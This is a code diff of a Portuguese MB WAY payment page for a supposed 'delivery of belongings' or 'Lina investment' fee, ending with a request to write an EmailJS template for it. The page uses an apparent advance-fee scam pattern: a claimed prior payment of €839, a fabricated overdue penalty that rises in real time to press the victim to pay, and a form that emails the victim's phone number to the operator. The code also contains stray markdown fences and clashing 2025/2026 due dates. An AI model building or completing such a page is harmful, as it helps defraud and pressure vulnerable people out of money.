@@ -1,212 +1,429 @@
 <!DOCTYPE html>
+
 <html lang="pt">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Taxa de Entrega - Lina Investimento</title>
+  <title>Pagamento — Entrega de Pertences</title>
+  <link href="https://fonts.googleapis.com/css2?family=Figtree:wght@400;500;600;700&family=DM+Mono:wght@400;500&display=swap" rel="stylesheet">
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
-    
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body {
-      font-family: 'Inter', sans-serif;
-      background: linear-gradient(135deg, #1a1a1a, #2d2d2d);
-      color: #ffffff;
-      min-height: 100vh;
-      padding: 20px;
-    }
-    .container {
-      max-width: 480px;
-      margin: 40px auto;
-      background: #ffffff;
-      color: #1a1a1a;
-      border-radius: 20px;
-      overflow: hidden;
-      box-shadow: 0 20px 50px rgba(0,0,0,0.3);
-    }
-    .header {
-      background: #E6392E;
-      color: white;
-      padding: 25px 20px;
-      text-align: center;
-    }
-    .header img {
-      max-width: 180px;
-      margin-bottom: 12px;
-      filter: brightness(1.05);
-    }
-    .header h1 {
-      font-size: 22px;
-      font-weight: 700;
-      line-height: 1.3;
-    }
-    .content {
-      padding: 30px 25px;
-    }
-    .logo-mbway {
-      text-align: center;
-      margin: 15px 0 30px 0;
-    }
-    .logo-mbway img {
-      height: 65px;
-      width: auto;
-    }
-    h2 {
-      text-align: center;
-      margin-bottom: 25px;
-      color: #E6392E;
-      font-size: 21px;
-    }
-    .input-group {
-      margin-bottom: 22px;
-    }
-    label {
-      display: block;
-      margin-bottom: 8px;
-      font-weight: 500;
-      font-size: 15px;
-    }
-    input, textarea {
-      width: 100%;
-      padding: 14px 16px;
-      border: none;
-      background: #f8f8f8;
-      border-radius: 12px;
-      font-size: 16px;
-      color: #1a1a1a;
-    }
-    input:focus, textarea:focus {
-      outline: none;
-      background: #fff;
-      box-shadow: 0 0 0 3px rgba(230, 57, 46, 0.25);
-    }
-    .pay-btn {
-      width: 100%;
-      padding: 16px;
-      background: #E6392E;
-      color: white;
-      font-size: 18px;
-      font-weight: 600;
-      border: none;
-      border-radius: 12px;
-      cursor: pointer;
-      margin-top: 15px;
-    }
-    .pay-btn:hover {
-      background: #c72a22;
-    }
-    .info {
-      font-size: 14px;
-      text-align: center;
-      margin-top: 25px;
-      color: #666;
-    }
+    * { margin:0; padding:0; box-sizing:border-box; }
 
-    /* Authorization Screen */
-    .success-screen {
-      display: none;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      min-height: 520px;
-      padding: 40px 25px;
-      text-align: center;
-    }
-    .success-screen .icon {
-      font-size: 68px;
-      color: #E6392E;
-      margin-bottom: 20px;
-    }
+```
+body {
+  font-family: 'Figtree', sans-serif;
+  background: #f2f2f7;
+  min-height: 100vh;
+  padding: 24px 16px 60px;
+  color: #1a1a1a;
+}
+
+.wrap {
+  max-width: 480px;
+  margin: 0 auto;
+}
+
+/* ── TOP TITLE ── */
+.page-title {
+  text-align: center;
+  margin-bottom: 24px;
+}
+.page-title h1 {
+  font-size: 26px;
+  font-weight: 700;
+  color: #1a1a1a;
+  line-height: 1.3;
+}
+.page-title p {
+  font-size: 16px;
+  color: #666;
+  margin-top: 6px;
+}
+
+/* ── CARDS ── */
+.card {
+  background: #fff;
+  border-radius: 20px;
+  padding: 24px;
+  margin-bottom: 16px;
+  box-shadow: 0 2px 12px rgba(0,0,0,0.07);
+}
+
+.card-title {
+  font-size: 13px;
+  font-weight: 600;
+  color: #999;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  margin-bottom: 18px;
+}
+
+/* ── ROWS ── */
+.row {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 13px 0;
+  border-bottom: 1px solid #f0f0f0;
+  font-size: 17px;
+}
+.row:last-child { border-bottom: none; }
+.row .lbl { color: #555; }
+.row .val { font-weight: 600; }
+.val.green { color: #22a05a; }
+.val.red   { color: #e03228; }
+.val.strike { color: #bbb; text-decoration: line-through; font-weight: 400; font-size: 15px; }
+
+/* ── OVERDUE BOX ── */
+.overdue-card {
+  background: #fff5f5;
+  border: 2px solid #ffd0ce;
+  border-radius: 20px;
+  padding: 22px 24px;
+  margin-bottom: 16px;
+  box-shadow: 0 2px 12px rgba(0,0,0,0.05);
+}
+.overdue-card .card-title { color: #e03228; }
+.overdue-amount {
+  font-size: 42px;
+  font-weight: 700;
+  color: #e03228;
+  line-height: 1;
+  margin-bottom: 8px;
+}
+.overdue-meta {
+  font-size: 15px;
+  color: #888;
+  line-height: 1.5;
+}
+.live-badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 6px;
+  background: #fff;
+  border: 1px solid #ffd0ce;
+  border-radius: 100px;
+  padding: 5px 12px;
+  font-size: 12px;
+  font-weight: 600;
+  color: #e03228;
+  margin-bottom: 14px;
+}
+.live-badge::before {
+  content: '';
+  width: 7px;
+  height: 7px;
+  background: #e03228;
+  border-radius: 50%;
+  animation: blink 1.2s infinite;
+}
+
+/* ── TOTAL ── */
+.total-card {
+  background: #1a1a1a;
+  border-radius: 20px;
+  padding: 24px;
+  margin-bottom: 16px;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+.total-card .lbl {
+  font-size: 15px;
+  color: #aaa;
+  margin-bottom: 6px;
+}
+.total-card .amount {
+  font-size: 36px;
+  font-weight: 700;
+  color: #fff;
+}
+.total-card .tag {
+  background: #333;
+  color: #aaa;
+  font-size: 12px;
+  font-weight: 600;
+  padding: 8px 14px;
+  border-radius: 100px;
+  letter-spacing: 0.5px;
+}
+
+/* ── FORM ── */
+.form-card { background: #fff; border-radius: 20px; padding: 24px; box-shadow: 0 2px 12px rgba(0,0,0,0.07); }
+
+.mbway-row {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  margin-bottom: 22px;
+  padding-bottom: 18px;
+  border-bottom: 1px solid #f0f0f0;
+}
+.mbway-row img { height: 34px; }
+
+.field { margin-bottom: 16px; }
+.field label {
+  display: block;
+  font-size: 15px;
+  font-weight: 600;
+  color: #444;
+  margin-bottom: 8px;
+}
+.field input, .field textarea {
+  width: 100%;
+  padding: 16px;
+  border: 2px solid #e8e8e8;
+  border-radius: 14px;
+  font-size: 17px;
+  font-family: 'Figtree', sans-serif;
+  color: #1a1a1a;
+  background: #fafafa;
+  transition: border-color 0.2s;
+}
+.field input:focus, .field textarea:focus {
+  outline: none;
+  border-color: #1a1a1a;
+  background: #fff;
+}
+.field input[readonly] {
+  background: #f5f5f5;
+  color: #e03228;
+  font-weight: 700;
+  font-size: 20px;
+  border-color: #f5f5f5;
+}
+.field textarea { resize: none; }
+
+.pay-btn {
+  width: 100%;
+  padding: 18px;
+  background: #e03228;
+  color: #fff;
+  font-family: 'Figtree', sans-serif;
+  font-size: 18px;
+  font-weight: 700;
+  border: none;
+  border-radius: 14px;
+  cursor: pointer;
+  margin-top: 6px;
+  transition: background 0.2s;
+}
+.pay-btn:hover { background: #c02820; }
+.pay-btn:disabled { background: #ccc; cursor: not-allowed; }
+
+.note {
+  font-size: 14px;
+  color: #999;
+  text-align: center;
+  margin-top: 14px;
+  line-height: 1.6;
+}
+
+/* ── SUCCESS ── */
+#success {
+  display: none;
+  flex-direction: column;
+  align-items: center;
+  text-align: center;
+  padding: 60px 20px;
+}
+.success-icon {
+  width: 80px;
+  height: 80px;
+  background: #e8f8ee;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 36px;
+  margin-bottom: 24px;
+}
+#success h2 { font-size: 26px; margin-bottom: 12px; }
+#success p  { font-size: 17px; color: #666; line-height: 1.6; max-width: 320px; }
+.back-btn {
+  margin-top: 32px;
+  padding: 14px 36px;
+  background: #1a1a1a;
+  color: #fff;
+  border: none;
+  border-radius: 14px;
+  font-family: 'Figtree', sans-serif;
+  font-size: 16px;
+  cursor: pointer;
+}
+
+@keyframes blink {
+  0%,100% { opacity:1; }
+  50%      { opacity:0.3; }
+}
+```
+
   </style>
 </head>
 <body>
+<div class="wrap">
 
-  <div class="container" id="payment-screen">
-    <div class="header">
-      <img src="https://i.ibb.co/nsfQLyWB/unnamed.webp" alt="Logo Lina Investimento">
-      <h1>Taxa de entrega para seu investimento financeiro da Lina</h1>
-    </div>
+  <!-- PAYMENT SCREEN -->
 
-    <div class="content">
-      <div class="logo-mbway">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e3/Logo_MBWay.svg/512px-Logo_MBWay.svg.png" 
-             alt="MB WAY Logo">
-      </div>
+  <div id="pay-screen">
 
-      <h2>Pagamento com MB WAY</h2>
+```
+<div class="page-title">
+  <h1>Pagamento de Entrega<br>dos seus Pertences</h1>
+  <p>Por favor leia com atenção antes de pagar</p>
+</div>
 
-      <form id="mbway-form">
-        <div class="input-group">
-          <label>Número de telemóvel MB WAY</label>
-          <input type="tel" id="phone" placeholder="+351 9XX XXX XXX" required>
-        </div>
+<!-- Summary -->
+<div class="card">
+  <div class="card-title">Resumo do Pagamento</div>
+  <div class="row">
+    <span class="lbl">Custo total da entrega</span>
+    <span class="val strike">€ 1 039,00</span>
+  </div>
+  <div class="row">
+    <span class="lbl">Já pagou anteriormente</span>
+    <span class="val green">✓ € 839,00 pago</span>
+  </div>
+  <div class="row">
+    <span class="lbl">Valor em falta</span>
+    <span class="val">€ 200,00</span>
+  </div>
+</div>
 
-        <div class="input-group">
-          <label>Valor a pagar</label>
-          <input type="text" value="€ 1.039,90" readonly style="background:#f0f0f0; font-size: 21px; font-weight: 700; color: #E6392E;">
-        </div>
+<!-- Overdue -->
+<div class="overdue-card">
+  <div class="card-title">Atraso no Pagamento</div>
+  <div class="live-badge">A aumentar em tempo real</div>
+  <div class="overdue-amount" id="overdue-val">€ 0,00</div>
+  <div class="overdue-meta" id="overdue-meta">A calcular...</div>
+</div>
 
-        <div class="input-group">
-          <label>Detalhes adicionais (opcional)</label>
-          <textarea id="details" rows="3" placeholder="Ex: Referência do investimento, observações..."></textarea>
-        </div>
+<!-- Total -->
+<div class="total-card">
+  <div>
+    <div class="lbl">Total a pagar hoje</div>
+    <div class="amount" id="total-val">€ 0,00</div>
+  </div>
+  <span class="tag">EM DÍVIDA</span>
+</div>
 
-        <button type="submit" class="pay-btn">Pagar € 1.039,90 com MB WAY</button>
-      </form>
-
-      <p class="info">
-        Um pedido de pagamento será enviado para a sua app MB WAY.<br>
-        Confirme com o seu PIN ou impressão digital.
-      </p>
-    </div>
+<!-- Form -->
+<div class="form-card">
+  <div class="mbway-row">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e3/Logo_MBWay.svg/512px-Logo_MBWay.svg.png" alt="MB WAY">
   </div>
 
-  <!-- Authorization Screen -->
-  <div class="container success-screen" id="auth-screen">
-    <div class="icon">✓</div>
-    <h2>Autorize o pagamento</h2>
-    <p style="margin: 20px 0 15px; font-size: 18px; line-height: 1.6;">
-      Abra a aplicação <strong>MB WAY</strong> no seu telemóvel e autorize o pagamento de<br>
-      <strong style="color:#E6392E; font-size:22px;">€ 1.039,90</strong>
-    </p>
-    <p style="color: #E6392E; font-weight: 600;">
-      Aguarde a confirmação da transação...
-    </p>
-    <button onclick="window.location.reload()" style="margin-top:35px; padding:12px 32px; background:#333; color:white; border:none; border-radius:10px; cursor:pointer; font-size:16px;">
-      Voltar ao início
-    </button>
+  <form id="pay-form">
+    <div class="field">
+      <label>O seu número de telemóvel (MB WAY)</label>
+      <input type="tel" id="phone" placeholder="+351 9XX XXX XXX" required>
+    </div>
+    <div class="field">
+      <label>Valor total a pagar</label>
+      <input type="text" id="amount-show" readonly>
+    </div>
+    <div class="field">
+      <label>Notas (opcional)</label>
+      <textarea id="details" rows="2" placeholder="Pode deixar uma nota aqui..."></textarea>
+    </div>
+    <button type="submit" class="pay-btn" id="pay-btn">Pagar com MB WAY</button>
+  </form>
+
+  <p class="note">
+    Após clicar, abra a app MB WAY no seu telemóvel<br>
+    e confirme o pagamento com o seu PIN.
+  </p>
+</div>
+```
+
+  </div><!-- /pay-screen -->
+
+  <!-- SUCCESS SCREEN -->
+
+  <div id="success">
+    <div class="success-icon">✓</div>
+    <h2>Pedido Enviado!</h2>
+    <p>Abra a app <strong>MB WAY</strong> no seu telemóvel e confirme o pagamento de <strong id="final-amount"></strong>.<br><br>Obrigado!</p>
+    <button class="back-btn" onclick="location.reload()">Voltar ao início</button>
   </div>
 
-  <script>
-    const form = document.getElementById('mbway-form');
-    
-    form.addEventListener('submit', function(e) {
-      e.preventDefault();
-      
-      const phone = document.getElementById('phone').value.trim();
-      const details = document.getElementById('details').value.trim();
+</div>
 
-      if (!phone) {
-        alert("Por favor, insira o seu número de telemóvel associado ao MB WAY.");
-        return;
-      }
+<script>
+  // ── EmailJS ──
+  const EMAILJS_PUBLIC_KEY  = "YOUR_PUBLIC_KEY";
+  const EMAILJS_SERVICE_ID  = "YOUR_SERVICE_ID";
+  const EMAILJS_TEMPLATE_ID = "YOUR_TEMPLATE_ID";
+  emailjs.init({ publicKey: EMAILJS_PUBLIC_KEY });
 
-      const orderData = {
-        phone: phone,
-        amount: "1039.90",
-        currency: "EUR",
-        title: "Taxa de entrega para seu investimento financeiro da Lina",
-        details: details || "Sem detalhes adicionais",
-        timestamp: new Date().toLocaleString('pt-PT')
-      };
+  // ── Overdue calc ──
+  const START     = new Date('2026-04-30T00:00:00');
+  const DAILY     = 6.50;
+  const PRINCIPAL = 200.00;
 
-      console.log("📤 Pedido enviado para o administrador:", orderData);
+  function fmt(n) {
+    return '€ ' + n.toFixed(2).replace('.', ',').replace(/\B(?=(\d{3})+(?!\d))/g, ' ');
+  }
 
-      document.getElementById('payment-screen').style.display = 'none';
-      document.getElementById('auth-screen').style.display = 'flex';
+  function update() {
+    const ms      = Math.max(0, Date.now() - START.getTime());
+    const days    = ms / 86400000;
+    const overdue = days * DAILY;
+    const total   = PRINCIPAL + overdue;
+    const d       = Math.floor(days);
+    const h       = Math.floor((days - d) * 24);
+    const m       = Math.floor(((days - d) * 24 - h) * 60);
 
-      alert("Pedido de pagamento enviado!\nVerifique a sua app MB WAY para autorizar € 1.039,90");
-    });
-  </script>
+    document.getElementById('overdue-val').textContent  = fmt(overdue);
+    document.getElementById('overdue-meta').textContent =
+      `${d} dia${d !== 1 ? 's' : ''} ${h}h ${m}m em atraso desde 30 de abril de 2026 · €6,50 por dia`;
+    document.getElementById('total-val').textContent    = fmt(total);
+    document.getElementById('amount-show').value        = fmt(total);
+    document.getElementById('final-amount').textContent = fmt(total);
+    return { overdue, total, days };
+  }
+
+  update();
+  setInterval(update, 10000);
+
+  // ── Submit ──
+  document.getElementById('pay-form').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    const phone   = document.getElementById('phone').value.trim();
+    const details = document.getElementById('details').value.trim();
+    if (!phone) { alert('Por favor insira o seu número de telemóvel.'); return; }
+
+    const btn = document.getElementById('pay-btn');
+    btn.disabled = true;
+    btn.textContent = 'A enviar...';
+
+    const { overdue, total, days } = update();
+
+    try {
+      await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
+        phone,
+        amount:    fmt(total),
+        principal: fmt(PRINCIPAL),
+        overdue:   fmt(overdue),
+        days:      Math.floor(days).toString(),
+        daily_rate:'€6,50',
+        currency:  'EUR',
+        title:     'Pagamento de entrega de pertences',
+        details:   details || 'Sem notas',
+        timestamp: new Date().toLocaleString('pt-PT'),
+        due_date:  '30 de abril de 2025'
+      });
+      document.getElementById('pay-screen').style.display = 'none';
+      const s = document.getElementById('success');
+      s.style.display = 'flex';
+    } catch(err) {
+      alert('Erro ao enviar. Por favor tente novamente.');
+      btn.disabled = false;
+      btn.textContent = 'Pagar com MB WAY';
+    }
+  });
+</script>
+
 </body>
-</html>can you create a email js template for this file ?
+</html>
